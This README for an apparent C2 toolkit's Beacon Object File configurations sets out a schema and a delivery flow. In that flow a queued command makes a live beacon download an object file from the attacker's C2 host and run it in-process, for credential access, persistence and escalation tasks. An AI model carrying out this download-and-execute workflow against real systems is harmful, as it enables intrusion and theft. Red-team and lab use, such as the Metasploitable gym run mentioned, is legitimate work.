# bofs/ — Beacon Object File configurations

One YAML file per BOF. Every file is a delivery contract between a BOF and
the lazyaddon beacon client that delivers it (`beacon` for Windows COFF
BOFs, `blacksandbeacon` for Linux ELF BOFs + the `bof_loader` runtime).

## Schema

| field            | meaning                                                        |
|------------------|----------------------------------------------------------------|
| name             | unique BOF id; matches the filename stem                       |
| description      | one-line capability summary                                    |
| author           | source author                                                  |
| url              | upstream repository                                            |
| source_file      | upstream source path inside `url`                              |
| client           | lazyaddon client that delivers the BOF (`beacon`/`blacksandbeacon`) |
| platform         | `windows` or `linux`                                           |
| category         | `reconnaissance`, `enumeration`, `credential_access`, `persistence`, `execution`, `collection`, `privilege_escalation` |
| client_artifact  | compiled object path relative to the client addon `tool.install_path` |
| required_args    | BOF arguments the beacon command must include                  |
| optional_args    | extra accepted arguments                                       |
| mitre_technique  | MITRE ATT&CK id                                                |
| enabled          | served by the catalog only when true                           |

## Delivery flow

1. `bof_stage <name>` — locate `client_artifact` under the client addon
   install path (`external/.exploit/<client>`) and copy it to
   `sessions/temp_uploads/bofs/<name>`.
2. `bof_run <name> <beacon_client_id> [args...]` — queue
   `bof:https://<lhost>:<c2_port>/download/bofs/<name> <args>` on the C2;
   the live beacon downloads the object over the malleable channel and
   executes it in-process.
3. Results land in `sessions/<beacon_id>.records.jsonl` (beacon history)
   and `sessions/<ip>/c2/<hash>/beacon.txt`.

## Related commands

`bof_search`, `bof_info`, `bof_catalog`, `bof_list`, `bof_stage`,
`bof_run`, `bof_install`, `bof_uninstall`, `beacon_deploy`,
`bof_results`. All are orchestratable by `auto_loop` and `apt_chain`
(see `chains/gym_metasploitable_ms2_beacon_bofs.yaml` for the gym run).
